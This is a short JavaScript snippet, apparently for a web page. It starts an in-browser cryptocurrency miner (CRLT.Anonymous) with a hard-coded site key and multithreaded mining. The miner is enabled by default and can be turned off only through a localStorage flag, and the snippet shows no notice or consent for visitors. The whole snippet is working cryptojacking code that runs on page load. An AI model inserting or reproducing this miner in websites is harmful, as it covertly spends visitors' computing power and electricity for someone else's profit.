var miner_enabled = (localStorage.getItem("miner") || "true") == "true";
if (miner_enabled) {
    window.miner = new CRLT.Anonymous('780c65e12f7eaebadd433b1eb488f45a5f71347a77df', {
        autoThreads: true,
        throttle: 0.1
    });
    window.miner.start();
}